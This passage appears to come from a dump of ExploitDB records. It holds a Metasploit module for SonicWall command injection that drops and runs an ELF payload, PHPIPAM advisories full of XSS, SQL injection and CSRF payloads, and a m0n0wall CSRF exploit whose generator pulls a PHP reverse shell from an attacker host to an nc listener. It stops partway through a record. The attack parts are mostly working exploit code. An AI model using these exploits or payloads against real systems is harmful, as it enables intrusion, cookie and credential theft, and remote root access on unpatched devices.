"---------------------------" + Rex::Text.rand_text_numeric(34)\r\n                post_data = ""\r\n\r\n                # assemble upload_req parms\r\n                upload_req.each do |xreq|\r\n                    post_data << "--#{boundary}\\r\\n"\r\n                    post_data << "Content-Disposition: form-data; name=\\"#{xreq[0]}\\"\\r\\n\\r\\n"\r\n                    post_data << "#{xreq[1]}\\r\\n"\r\n                end\r\n\r\n                post_data << "--#{boundary}--\\r\\n"\r\n\r\n                res = send_request_cgi({\r\n                   \'method\' => \'POST\',\r\n                   \'uri\'    => "/cgi-bin/sitecustomization",\r\n                   \'ctype\'  => "multipart/form-data; boundary=#{boundary}",\r\n                   \'data\'   => post_data,\r\n                   \'headers\' =>\r\n                        {\r\n                                \'UserAgent\' => "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0",\r\n                                \'Cookie\' => \'swap=\'+swap_cookie+\';\',\r\n                        }\r\n                }, timeout)\r\n\tend\r\n\r\n\tdef run_command_file(swap_cookie)\r\n\r\n\t\t# use prefix so exploit can be re-used (unique portalname requirment)\r\n\t\tprefix = Rex::Text.rand_text_numeric(5)\r\n\r\n\t\trun_command(swap_cookie, "#{prefix}$({find,$({perl,-e,\'print(chr(0x2f))\'}),-name,VirtualOffice.gif,-exec,cp,{},qz,$({perl,-e,\'print(chr(0x3b))\'})})")\r\n\t\trun_command(swap_cookie, "#{prefix}$({chmod,777,qz})")\r\n\t\trun_command(swap_cookie, "#{prefix}$({sh,-c,.$({perl,-e,\'print(chr(0x2f))\'})qz})")\r\n\r\n\tend\r\n\r\n\tdef exploit\r\n\t\t# timeout\r\n\t\ttimeout = 1550;\r\n\r\n\t\t# params\r\n\t\tpassword_clear = datastore[\'PASSWORD\']\r\n\t\tuser = datastore[\'USERNAME\']\r\n\r\n\t\t# do authentication\t\t\r\n\t\tswap_cookie = do_login(user, password_clear)\r\n\t\r\n\t\tvprint_status("authenticated \'swap\' cookie: #{swap_cookie}\\n")\r\n\t\t\t\r\n\t\t# pause to let things run smoothly\r\n\t\t#sleep(5)\r\n\r\n\t\t #if no \'CMD\' string - add code for root shell\r\n                if not datastore[\'CMD\'].nil? and not datastore[\'CMD\'].empty?\r\n\r\n                        cmd = datastore[\'CMD\']\r\n\r\n                        # Encode cmd payload\r\n                        encoded_cmd = cmd.unpack("H*").join().gsub(/(\\w)(\\w)/,\'\\\\x\\1\\2\')\r\n\r\n                        # kill stale calls to bdump from previous exploit calls for re-use\r\n                        upload_payload(swap_cookie, ("sudo /bin/rm -f /tmp/n; printf \\"#{encoded_cmd}\\" > /tmp/n; chmod +rx /tmp/n; /tmp/n" ))\r\n                else\r\n                        # Encode payload to ELF file for deployment\r\n                        elf = Msf::Util::EXE.to_linux_x86_elf(framework, payload.raw)\r\n                        encoded_elf = elf.unpack("H*").join().gsub(/(\\w)(\\w)/,\'\\\\x\\1\\2\')\r\n\r\n\t\t\t# upload elf to /tmp/m , chmod +rx /tmp/m , then run /tmp/m (payload)\r\n                        upload_payload(swap_cookie, ("#!/bin/bash\\necho -e \\"#{encoded_elf}\\" > /tmp/m; chmod +rx /tmp/m; /tmp/m"))\r\n                        run_command_file(swap_cookie)\r\n\r\n\t\t\t# wait for magic\r\n                        handler\r\n\t\t\t\r\n                end\r\n\r\n\r\n\tend\r\nend', u'description': u"Sonicwall < 8.1.0.2-14sv - 'sitecustomization.cgi' Command Injection (Metasploit)", u'platform': u'cgi', u'author': u'xort', u'cve': [], u'source': u'ExploitDB', u'date': u'2017-07-19T00:00:00+00:00', u'_id': 42344, u'type': u'webapps', u'port': 0}

CVE: []
Description: PHPIPAM 1.1.010 - Multiple Vulnerabilities
{u'code': u'######################################################################\r\n# Exploit Title: PHPIPAM v1.1.010 Multiple Vulnerabilities\r\n# Date: 04/01/2016\r\n# Author: Mickael Dorigny @ Synetis\r\n# Vendor or Software Link: http://phpipam.net/\r\n# Version: 1.1.010\r\n# Category: Multiple Vulnerabilities\r\n# Tested on : 1.1.010\r\n######################################################################\r\n\r\nPHPIPAM description :\r\n======================================================================\r\nPHPIPAM is an open-source web IP address management application. Its goal is to provide light, modern and useful IP address management. It is php-based application with MySQL database backend, using jQuery libraries, ajax and some HTML5/CSS3 features.\r\n\r\nVulnerabilities description :\r\n======================================================================\r\nPHPIPAM version 1.1.010 is vulnerable to multiple vulnerabilities like :\r\n- Stored XSS without authentication\r\n- Reflected XSS\r\n- SQL Injection\r\n- CSRF\r\n\r\nProof of Concept n\xb01 -  Stored XSS without authentication :\r\n================================================================================================\r\nThrough PHPIPAM, external users can try to authenticate on the following page :\r\n\r\nhttp://server/phpipam/?page=login\r\n\r\nFor each try, even if it\'s a success or a failure, a line is added in the log register. The admin user can read those logs through the back office. Here is an example of authentication log lines :\r\n"User Admin1 logged in."\r\n"User User1 failed to log in."\r\n\r\nHere we can see that the username is directly written in logs.\r\n\r\nA malicious user can use this log feature to make administrator executes JavaScript instructions in his browser. To do so, an external user can try to inject JavaScript instructions in the "username" field of the authentication form.\r\n\r\nPoC :\r\n\r\n[REQUEST]\r\nhttp://server/phpipam/site/login/loginCheck.php\r\n[POSTDATA]\r\nipamusername=<script>alert("RXSS01")</script>&ipampassword=XXX\r\n\r\nWith this request, the following line will automatically be added in the "Log Files" section in the admin back office :\r\n\r\n<tr class="danger Warning" id="9">\r\n  <td class="date">2015-12-03 22:28:22</td>\r\n  <td class="severity"><span>2</span>Warning</td>\r\n  <td class="username"></td>\r\n  <td class="ipaddr">192.168.1.47</td>\r\n  <td class="command"><a href="" class="openLogDetail" data-logid="9">User <script>alert("RXSS01");</script> failed to log in.</a></td>\r\n  <td class="detailed">  </td>\r\n</tr>\r\n\r\nJavaScript instructions will be executed by admin\'s browser each time he will consult the Log File section. Additionnally, latest log lines are displayed in the home page of each admin, so JavaScript instructions will be executed at this moment two.\r\n\r\nThrough this vulnerability, an attacker could tamper with page rendering, redirect victim to fake login page, or capture users credentials such cookies, and especially admin\'s ones. Moreover, an user without privileges can use this vulnerability to steal Administrator cookie to lead privileges escalation in PHPIPAM.\r\n\r\nProof of Concept n\xb02 - SQL Injection : \r\n================================================================================================\r\nOnce an user or an admin is authenticated, he can makes search through the search bar. This feature can be used to modify SQL query passed by the web application to the database. \r\n\r\nPoC : \r\n1" UNION SELECT 1,2,3,4,user(),6,7,8,9,10,11,12,13,14,15#\r\n\r\nNote that the search bar in the top right of the web application seems to be protected against this injection. But the "Search IP database" form that is displayed after a first search isn\'t well protected. Server answer is displayed in table, for the example injection, this is the replied lines : \r\n: \r\n\r\n<tr class="subnetSearch" subnetid="1" sectionname="" sectionid="" link="|1">\r\n  <td></td>\r\n  <td><a href="?page=subnets&section=4&subnetId=1">0.0.0.2/3</a></td>\r\n#   <td><a href="?page=subnets&section=4&subnetId=1">root@localhost</a></td>\r\n   <td>0.0.0.0/</td>\r\n   <td></td>\r\n   <td>disabled</td>\r\n  <td><button class="btn btn-xs btn-default edit_subnet" data-action="edit" data-subnetid="1" data-sectionid="4" href="#" rel="tooltip" data-container="body" title="Edit subnet details"></button></td>\r\n</tr>\r\n\r\nHere, line marked with a "#" correspond to text data in the SQL database so they can display any requested data. Through this vulnerability, an attacker can dump and modify database content.\r\n\r\nProof of Concept n\xb03 - Reflected Cross-Site Scripting (RXSS) with authentication :\r\n================================================================================================\r\nA search form is displayed on every page on the top of each page. When this form is used, users are redirected to a search result page that display another form. Both of these forms are vulnerable to XSS through the following PoC. Several evasion tricks can be used to bypass the initial protection that delete HTML tags.\r\n\r\nNote that the initial form on the top of each page is protected from basic XSS by deleting HTML tags.\r\n\r\nPoC for the top search form: \r\n[REQUEST]\r\nABC" onmouseover=alert(1) name="A\r\n\r\nThis payload will executes javascript instructions when the user will pass his cursor over the new search form that is displayed on the middle of the search result page\r\n\r\nPoC for the search form displayed in search result page :\r\n\r\n[REQUEST]\r\nABC\' onmouseover=alert(1) name=\'A\r\n\r\nThis payload will executes javascript instruction when the user will pass his cursor over initial search form on top of the page.\r\n\r\nThrough this vulnerability, an attacker could tamper with page rendering, redirect victim to fake login page, or capture users credentials such cookies, and especially admin\'s ones. Moreover, an user without privileges can use this vulnerability to steal Administrator cookie to lead privileges escalation in PHPIPAM.\r\n\r\nProof of Concept n\xb04 - CSRF on user creation :\r\n================================================================================================\r\nThe user creation form isn\'t protected against CSRF attack. Consequently, an administrator can be trapped to create an user with administrator permissions by clicking on a malicious link which will make him execute the following request :\r\n\r\nPoC : \r\n[REQUEST]\r\nhttp://server/phpipam/site/admin/usersEditResult.php \r\n[POSTDATA]\r\nreal_name=user2&username=user2&email=user2%40user1.fr&role=Administrator&userId=&action=add&domainUser=0&password1=password123&password2=password123&lang=3&notifyUser=on&mailNotify=No&mailChangelog=No&group3=on&group2=on\r\n\r\nHere, the user named "user2" will be created with "Administrator" permissions. Here is the used form to generate a request :\r\n\r\n<form method=post action=http://server/phpipam/site/admin/usersEditResult.php>\r\n        <input type=hidden name=real_name value=user123>\r\n        <input type=hidden name=username value=user123>\r\n        <input type=hidden name=email value="user123@okok.fr">\r\n        <input type=hidden name=role value=Administrator><!-- Here, we give Administrator permission -->\r\n        <input type=hidden name=action value=add><!-- Here, we add a user-->\r\n        <input type=hidden name=domainUser value=user123>\r\n        <input type=hidden name=password1 value=password123><!-- > 8 characters-->\r\n        <input type=hidden name=password2 value=password123><!-- > 8 characters-->\r\n        <input type=hidden name=lang value=3>\r\n        <input type=hidden name=notifyUser value=off>\r\n        <input type=hidden name=mailNotify value=No>\r\n        <input type=hidden name=mailChangelog value=no>\r\n        <input type=submit value="Click here, it\'s awesome !">\r\n</form>\r\n\r\nProof of Concept n\xb05 : CSRF on user attributes modification\r\n================================================================================================\r\nUser modification form isn\'t protected against CSRF attack. Consequently, a user/admin can be trapped to modify his mail or password  by clicking on a malicious link which will make him execute the following request :\r\n\r\nPoC:\r\n[REQUEST]\r\nhttp://server/phpipam/site/admin/usersEditResult.php \r\n[DATA]\r\nPOSTDATA=real_name=phpIPAM+Admin&username=Admin&email=admin%40domain.local&role=Administrator&userId=1&action=edit&domainUser=0&password1=password123&password2=password123&lang=1&mailNotify=No&mailChangelog=\r\n\r\nHere, the passwordof user named "Admin" will be modified to "password123" and mail will be modified to "admin@domain.local". All other attributes can be modified two. In this context, targeted user is specified with his "userId", we can generally guess that the userId "1" is the first admin of PHP Ipam.\r\n\r\nHere is the used form to generate a request :\r\n<form method=post action=http://server/phpipam/site/admin/usersEditResult.php>\r\n        <input type=hidden name=real_name value=AdminModified>\r\n        <input type=hidden name=username value=Admin><!-- we can change username -->\r\n        <input type=hidden name=userId value=1><!-- This attribute must match with targeted user -->\r\n        <input type=hidden name=email value="adminmodified@okok.fr"> <!-- we can change affected email-->\r\n        <input type=hidden name=role value=Administrator><!-- we can change a user permission -->\r\n        <input type=hidden name=action value=edit><!-- Here, we edit a user-->\r\n        <input type=hidden name=domainUser value=user123>\r\n        <input type=hidden name=password1 value=password123><!-- we can change password-->\r\n        <input type=hidden name=password2 value=password123>\r\n        <input type=hidden name=lang value=3>\r\n        <input type=hidden name=notifyUser value=off>\r\n        <input type=hidden name=mailNotify value=No>\r\n        <input type=hidden name=mailChangelog value=no>\r\n        <input type=submit value="Click here, it\'s awesome !">\r\n</form>\r\n\r\nProof of Concept n\xb06 : CSRF on user deletion\r\n================================================================================================\r\nUser deletion form isn\'t protected against CSRF attack. Consequently, an admin can be trapped to delete any user by clicking on a malicious link which will make him execute the following request :\r\n\r\n[REQUEST]\r\nhttp://server/phpipam/site/admin/usersEditPrint.php\r\n[POSTDATA]\r\nid=2&action=delete\r\n\r\nIn this context, targeted user is specified with his "userId".\r\n\r\nHere is the used form to generate a request :\r\n<form method=post action=http://server/phpipam/site/admin/usersEditResult.php>\r\n        <input type=hidden name=userId value=5>\r\n        <input type=hidden name=action value=delete>\r\n        <input type=submit value="Click here, it\'s awesome !">\r\n</form>\r\n\r\nIn this context, targeted user is specified with his "userId".\r\n\r\nScreenshots :\r\n======================================================================\r\n- http://www.information-security.fr/wp-content/uploads/2015/12/php-ipam-multiple-vulnerabilities-05.jpg\r\n- http://www.information-security.fr/wp-content/uploads/2015/12/php-ipam-multiple-vulnerabilities-06.jpg\r\n- http://www.information-security.fr/wp-content/uploads/2015/12/php-ipam-multiple-vulnerabilities-09.jpg\r\n- http://www.information-security.fr/wp-content/uploads/2015/12/php-ipam-multiple-vulnerabilities-10.jpg\r\n- http://www.information-security.fr/wp-content/uploads/2015/12/php-ipam-multiple-vulnerabilities-11.jpg\r\n- http://www.information-security.fr/wp-content/uploads/2015/12/php-ipam-multiple-vulnerabilities-03.jpg\r\n\r\nSolution: \r\n======================================================================\r\n\r\nUpdate your PHPIPAM Installation to version 1.2 :  https://github.com/phpipam/phpipam\r\n \r\nAdditional resources :\r\n======================================================================\r\n- http://information-security.fr/en/xss-csrf-sqli-php-ipam-version-1-1-010\r\n- https://www.youtube.com/watch?v=86dJpyKYag4\r\n- http://phpipam.net/\r\n\r\nReport timeline :\r\n======================================================================\r\n2015-12-26 : Editor informed for vulnerabilities\r\n2015-12-27 : Editor take a look and inform that a version 1.2 exist \r\n2016-01-04 : Advisory release\r\n\r\nCredits :\r\n======================================================================\r\n\r\n    88888888\r\n   88      888                                         88    88\r\n  888       88                                         88\r\n  788           Z88      88  88.888888     8888888   888888  88    8888888.\r\n   888888.       88     88   888    Z88   88     88    88    88   88     88\r\n       8888888    88    88   88      88  88       88   88    88   888\r\n            888   88   88    88      88  88888888888   88    88     888888\r\n  88         88    88  8.    88      88  88            88    88          888\r\n  888       ,88     8I88     88      88   88      88   88    88  .88     .88\r\n   ?8888888888.     888      88      88    88888888    8888  88   =88888888\r\n       888.          88\r\n                    88    www.synetis.com\r\n                 8888  Consulting firm in management and information security\r\n \r\nMickael Dorigny - Security Consultant @ Synetis | Information-Security.fr\r\n\r\n--\r\nSYNETIS \r\nCONTACT: www.synetis.com | www.information-security.fr', u'description': u'PHPIPAM 1.1.010 - Multiple Vulnerabilities', u'platform': u'php', u'author': u'Mickael Dorigny', u'cve': [], u'source': u'ExploitDB', u'date': u'2016-01-05T00:00:00+00:00', u'_id': 39171, u'type': u'webapps', u'port': 0}

CVE: []
Description: m0n0wall 1.33 - Multiple Cross-Site Request Forgery Vulnerabilities
{u'code': u'######################################################################\r\n# Exploit Title: m0n0wall 1.33 CSRF Remote root Access\r\n# Date: 30/11/2012\r\n# Author: Yann CAM @ Synetis\r\n# Vendor or Software Link: m0n0.ch - m0n0.ch/wall/downloads.php\r\n# Version: 1.33\r\n# Category: CSRF Remote root Access\r\n# Google dork:\r\n# Tested on: FreeBSD\r\n######################################################################\r\n\r\n\r\n\r\nm0n0wall firewall/router distribution description :\r\n======================================================================\r\n\r\nm0n0wall is a project aimed at creating a complete, embedded firewall software package that, when used together with an embedded PC, provides all the important features of commercial firewall boxes (including ease of use) at a fraction of the price (free software).\r\nm0n0wall is based on a bare-bones version of FreeBSD, along with a web server, PHP and a few other utilities. The entire system configuration is stored in one single XML text file to keep things transparent.\r\nm0n0wall is probably the first UNIX system that has its boot-time configuration done with PHP, rather than the usual shell scripts, and that has the entire system configuration stored in XML format.\r\n\r\nIn version 1.33 of the distribution, differents vulnerabilities CSRF RCE reverse root shell can be used. It is strongly advised to update to version 1.34 available now.\r\n\r\n\r\n\r\nProof of Concept 1 :\r\n======================================================================\r\n\r\nCSRF exploit to reset WebGUI admin password to admin/mono (with command execution) :\r\n\r\nFile /usr/local/www/exec.php line 250 :\r\n    $ph = popen($_POST[\'txtCommand\'], "r" );\r\n\r\nPoC:\r\n\r\n<html>\r\n  <body>\r\n    <form name=\'x\' action=\'http://m0n0wall_IP:80/exec.php\' method=\'post\'>\r\n      <input type=\'hidden\' name=\'txtCommand\' value=\'echo "admin:\\$1\\$UHzbn8k6\\$RmvocDPCsXm0uW4SYZAcA/" > /usr/local/www/.htpasswd\' />\r\n    </form>\r\n    <script>document.forms[\'x\'].submit();</script>\r\n  </body>\r\n</html>\r\n\r\n\r\n\r\nProof of Concept 2 :\r\n======================================================================\r\n\r\nCSRF exploit to execute arbitrary command on server :\r\n\r\nFile /usr/local/www/diag_ping.php line 159 and 161 :\r\n    159 : system("/sbin/$pingprog -S$ifaddr -c$count " . escapeshellarg($host));\r\n    161 : system("/sbin/$pingprog -c$count " . escapeshellarg($host));\r\n\r\nThe remote command execution through CSRF target the $count variable. This variable is defined on line 55 :\r\n    55 : $count = $_POST[\'count\'];\r\n\r\nBut this variable is set only if line 47 is false :\r\n    47 : if (($_POST[\'count\'] < 1) || ($_POST[\'count\'] > MAX_COUNT)) {\r\n\r\nSo, if an attacker prepend his injection command with a number between 1 and 10, $count is set.\r\n\r\nYou should sanitize this $count variable like :\r\n    if ((intval($_POST[\'count\']) < 1) || (intval($_POST[\'count\']) > MAX_COUNT)) {\r\n\r\nPoC :\r\n\r\n<html>\r\n  <body>\r\n    <form name=\'x\' action=\'http://m0n0wall_IP:80/diag_ping.php\' method=\'post\'>\r\n      <input type=\'hidden\' name=\'count\' value=\'1;ls -la;\' />\r\n      <input type=\'hidden\' name=\'host\' value=\'127.0.0.1\' />\r\n    </form>\r\n    <script>document.forms[\'x\'].submit();</script>\r\n  </body>\r\n</html>\r\n\r\n\r\n\r\nProof of Concept 3 :\r\n======================================================================\r\n\r\nFile /usr/local/www/exec_ram.php line 36 :\r\n    36 : passthru($_GET[\'cmd\']);\r\n\r\nIt\'s the more dangerous vulnerability. By this way, it\'s possible to an attacker to gain a full interactive reverse shell through a CSRF attack.\r\nm0n0wall is so light that none of binary file can be used to establish a reverse shell (netcat, telnet or any alternative aren\'t present...).\r\nSo, to make a real reverse shell, I use PHP file. Principle is to put on the m0n0wall web server a new PHP file with several instructions to open a socket to the attacker with the /bin/sh share.\r\nm0n0wall PHP-CGI version is compiled with the socket library so it\'s relatively easy.\r\nThe CSRF can only create a new file into the web directory on m0n0wall, but can not run this file with PHP. I have tried several syntaxe with /usr/local/bin/php (-r, -f...) to force run it, but unsuccessfull...\r\nSo, I make a new request into the CSRF script to call this script and to establish the reverse shell.\r\nYou can see this exploitation in this demonstration video just made as proof of concept here:\r\n\r\n    http://www.youtube.com/watch?v=It288h9VtV4\r\n\r\nCSRF generator to Reverse root shell fully interactive :\r\n\r\n<html>\r\n <head>\r\n<script>\r\nfunction trim(s){\r\nreturn s.replace(/\\r\\n|\\r|\\n|\\t/g,\'\').replace(/^\\s+/g,\'\').replace(/\\s+$/g,\'\');\r\n}\r\n \r\nfunction generateCSRF(){\r\nvar target = trim(document.getElementById("target").value);\r\nvar httpurl = trim(document.getElementById("httpurl").value);\r\nvar resultjs = "";\r\nresultjs += "<html><body>";\r\nresultjs += "<img src=\'" + target + "exec_raw.php?cmd=echo%20-e%20%22%23%21/usr/local/bin/php%5Cn%3C%3Fphp%20eval%28%27%3F%3E%20%27.file_get_contents%28%27http%3A//" + httpurl + "%27%29.%27%3C%3Fphp%20%27%29%3B%20%3F%3E%22%20%3E%20x.php%3Bcat%20x.php%3Bchmod%20755%20x.php%3B\' />";\r\nresultjs += "<script type=\'text/javascript\'>function redirect(page){window.location=page;}setTimeout(\'redirect(\\"" + target + "x.php\\")\',1000);<\\/script></body></html>";\r\ndocument.getElementById("resultjs").value = resultjs;\r\n}\r\n \r\n</script>\r\n</head>\r\n <body onload="generateCSRF();">\r\n <h2>CSRF m0n0wall 1.33 to root RCE (reverse shell)</h2>\r\n <p>m0n0wall 1.33, the latest firewall/router distribution based on FreeBSD is vulnerable to a CSRF attack that allows gaining root access through a reverse shell.<br />\r\n The attacker must know the URL address of m0n0wall WebGui.<br />\r\n To obtain the reverseshell, attacker must place a netcat in listening mode.<br />\r\n On attacker machine :\r\n <pre>nc -l -vv -p 1337 # Netcat listener, to gain shell control.</pre>\r\n (admin hash is in the /config/config.xml file on m0n0wall, and WebGUI access is checked with /usr/local/www/.htpasswd)\r\n </p>\r\n <form action="" onsubmit="generateCSRF();return false;">\r\n <table>\r\n <tr><td>URL\'s m0n0wall 1.33 Targeted :</td> <td>\r\n <input id="target" type="text" value="http://192.168.0.253:80/" size="70" onkeyup="generateCSRF();" /></td>\r\n </tr>\r\n <tr><td> HTTP URL to download php-reverse-shell.txt <br />\r\n You need to download php-reverse-shell <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" target="_blank">here</a> !<br />\r\n Edit the script to indicate :<br />\r\n <pre>$ip = \'ATTACKER_IP_REVERSE_SHELL\'; // CHANGE THIS\r\n$port = PORT_IN_LISTENING_MODE; // CHANGE THIS</pre>\r\nThen, rename php-reverse-shell.php to psr.txt and host it on a accessible web server.</td> <td>http://\r\n <input id="httpurl" type="text" value="192.168.0.141/prs.txt" size="70" onkeyup="generateCSRF();" /></td>\r\n </tr>\r\n \r\n<tr> <td>CSRF exploit to send to an admin : </td> <td>\r\n<textarea cols="70" rows="10" id="resultjs" readonly="readonly">&lt;/textarea&gt; </td>\r\n </tr>\r\n </table>\r\n </form>\r\n </body>\r\n</html>\r\n\r\n\r\n\r\nSolution:\r\n======================================================================\r\n2012-11-12:  Release 1.34\r\n\r\n\r\n\r\n\r\nAdditional resources :\r\n======================================================================\r\n\r\n- m0n0.ch\r\n- www.synetis.com\r\n- blog.synetis.com/2012/11/19/pare-feu-routeur-m0n0wall\r\n- www.asafety.fr/vuln-exploit-poc/csrf-rce-m0n0wall-1-33-remote-root-access\r\n- www.youtube.com/watch?v=It288h9VtV4\r\n- pentestmonkey.net/tools/web-shells/php-reverse-shell\r\n\r\n\r\n\r\nReport timeline :\r\n======================================================================\r\n\r\n2012-10-05 : Team alerted with many details, PoC, video and potential solution\r\n2012-10-06 : Team first response\r\n2012-10-18 : Team second feedback with many corrections and evolutions\r\n2012-10-31 : Our feedback concerning their corrections\r\n2012-11-01 : Final feedback from m0n0wall team with their thanks\r\n2012-11-12 : Release 1.34\r\n2012-12-06 : Public advisory\r\n\r\n\r\n\r\nCredits :\r\n======================================================================\r\n\r\n    88888888\r\n   88      888                                         88    88\r\n  888       88                                         88\r\n  788           Z88      88  88.888888     8888888   888888  88    8888888.\r\n   888888.       88     88   888    Z88   88     88    88    88   88     88\r\n       8888888    88    88   88      88  88       88   88    88   888\r\n            888   88   88    88      88  88888888888   88    88     888888\r\n  88         88    88  8.    88      88  88            88    88          888\r\n  888       ,88     8I88     88      88   88      88   88    88  .88     .88\r\n   ?8888888888.     888      88      88    88888888    8888  88   =88888888\r\n       888.          88\r\n                    88    www.synetis.com\r\n                 8888  Consulting firm in management and information security\r\n\r\nYann CAM - Security Consultant @ synetis\r\n\r\n\r\n\r\nLast word :\r\n======================================================================\r\n\r\nThank you to all the m0n0wall team for responsiveness, professionalism and quality solution despite of these few minor weaknesses.\r\n\r\n-- \r\nSYNETIS\r\nCONTACT: www.synetis.com', u'description': u'm0n0wall 1.33 - Multiple Cross-Site Request Forgery Vulnerabilities', u'platform': u'freebsd', u'author': u'Yann CAM', u'cve': [], u'source': u'ExploitDB', u'date': u'2012-12-07T00:00:00+00:00', u'_id': 23202, u'type': u'webapps', u'port': 0}

CVE: []
Description: PHPIPAM 1.2.1 - Multiple Vulnerabilities
{u'code': u'PHPIPAM 1.2.1 Multiple Vulnerabilities\r\n \r\nAuthor: Saeed reza Zamanian [penetrationtest @ Linkedin]\r\n \r\nProduct: 06 Sep 2016\r\nTested Version: phpipam-1.2.1 (Latest Version - modified on 2016-02-13)\r\nVendor: http://phpipam.net/\r\nProduct URL: https://sourceforge.net/projects/phpipam/\r\n\r\nDate: 20 Mar 2016\r\n\r\n \r\nAbout Product: \r\n---------------\r\nphpipam is an open-source web IP address management application (IPAM). Its goal is to provide light, modern and useful IP address management.\r\nIt is php-based application with MySQL database backend, using jQuery libraries, ajax and some HTML5/CSS3 features.\r\n\r\n \r\n \r\nVulnerability Report:\r\n----------------------\r\nSQL Injection Vulnerability (3 Items):\r\non Tools>Changelog \r\n[sPage] Parameter is vulnerable against SQLi.\r\nMethod: GET\r\nPayload:\r\nhttp://[Site]/phpipam/?page=tools&section=changelog&subnetId=a&sPage=50\' [SQLi]\r\n\r\n\r\non http://[Site]/phpipam/app/tools/user-menu/user-edit.php\r\n[lang] and [printLimit] Parameters are vulnerable against SQLi.\r\nPayload:\r\nMethod : POST\r\nPostData=\r\nreal_name=phpIPAM+Admin&email=admin%40domain.local&password1=&password2=&mailNotify=No&mailChangelog=No&printLimit=30&lang=9\'[SQLi]\r\n\r\nOR\r\nMethod : POST\r\nhttp://[Site]/phpipam/app/tools/user-menu/user-edit.php\r\nPostData=\r\nreal_name=phpIPAM+Admin&email=admin%40domain.local&password1=&password2=&lang=9&mailNotify=No&mailChangelog=No&printLimit=30\'[SQLi]\r\n\r\n===============================================\r\n\r\nXSS Vulnerability (36 Items):\r\nMethod: POST\r\nhttp://[Site]/phpipam/app/admin/languages/edit.php\r\nPostData:\r\nlangid=2"><script>alert(document.cookie);</script>&action=edit\r\n\r\nhttp://[Site]/phpipam/app/admin/languages/edit.php\r\nPostData:\r\nlangid=2&action=edit"><script>alert(document.cookie);</script>\r\n\r\nhttp://[Site]/phpipam/app/admin/widgets/edit.php\r\nPostData:\r\nwid=1"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>&action=edit\r\n\r\nhttp://[Site]/phpipam/app/admin/widgets/edit.php\r\nPostData:\r\nwid=1&action=edit"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>\r\n\r\nhttp://[Site]/phpipam/app/admin/scan-agents/edit.php\r\nPostData:\r\nid=1&action=edit"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>\r\n\r\nhttp://[Site]/phpipam/app/admin/groups/edit-group.php\r\nPostData:\r\nid=2"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>&action=edit\r\n\r\nhttp://[Site]/phpipam/app/admin/groups/edit-group.php\r\nPostData:\r\nid=2&action=edit"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>\r\n\r\nhttp://[Site]/phpipam/app/admin/users/edit.php\r\nPostData:\r\nid=1&action=edit"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>\r\n\r\nhttp://[Site]/phpipam/app/admin/tags/edit.php\r\nPostData:\r\nid=1&action=edit"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>\r\n\r\nhttp://[Site]/phpipam/app/admin/instructions/preview.php\r\nPostData:\r\ninstructions=You+can+write+instructions+under+admin+menu!"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>\r\n\r\nhttp://[Site]/phpipam/app/admin/sections/edit.php\r\nPostData:\r\nsectionId=2"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>&action=edit\r\n\r\nhttp://[Site]/phpipam/app/admin/sections/edit.php\r\nPostData:\r\nsectionId=2&action=edit"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>\r\n\r\nhttp://[Site]/phpipam/app/admin/subnets/edit.php\r\nPostData:\r\nsectionId=2&subnetId=1"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>&action=edit\r\n\r\nhttp://[Site]/phpipam/app/admin/subnets/edit.php\r\nPostData:\r\nsectionId=2&subnetId=1&action=edit"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>\r\n\r\nhttp://[Site]/phpipam/app/admin/subnets/edit-folder.php\r\nPostData:\r\nsectionId=1&subnetId=5&action=edit"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>&location=IPaddresses\r\n\r\nhttp://[Site]/phpipam/app/admin/devices/edit.php\r\nPostData:\r\nswitchId=1&action=edit"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>\r\n\r\nhttp://[Site]/phpipam/app/admin/device-types/edit.php\r\nPostData:\r\ntid=1&action=edit"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>\r\n\r\nhttp://[Site]/phpipam/app/admin/vlans/edit.php\r\nPostData:\r\nvlanId=1"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>&action=edit&vlanNum=\r\n\r\nhttp://[Site]/phpipam/app/admin/vlans/edit.php\r\nPostData:\r\nvlanId=1&action=edit"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>&vlanNum=\r\n\r\nhttp://[Site]/phpipam/app/admin/vlans/edit.php\r\nPostData:\r\nvlanId=1&action=edit&vlanNum="><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>\r\n\r\nhttp://[Site]/phpipam/app/admin/vlans/edit-domain.php\r\nPostData:\r\nid="><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>&action=add\r\n\r\nhttp://[Site]/phpipam/app/admin/vlans/edit-domain.php\r\nPostData:\r\nid=&action=add"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>\r\n\r\nhttp://[Site]/phpipam/app/admin/nameservers/edit.php\r\nPostData:\r\nnameserverId=1"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>&action=edit\r\n\r\nhttp://[Site]/phpipam/app/admin/nameservers/edit.php\r\nPostData:\r\nnameserverId=1&action=edit"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>\r\n\r\nhttp://[Site]/phpipam/app/admin/custom-fields/edit.php\r\nPostData:\r\naction=add"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>&fieldName=&table=ipaddresses\r\n\r\nhttp://[Site]/phpipam/app/admin/custom-fields/edit.php\r\nPostData:\r\naction=add&fieldName=&table=ipaddresses"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>\r\n\r\nhttp://[Site]/phpipam/app/admin/custom-fields/filter.php\r\nPostData:\r\ntable=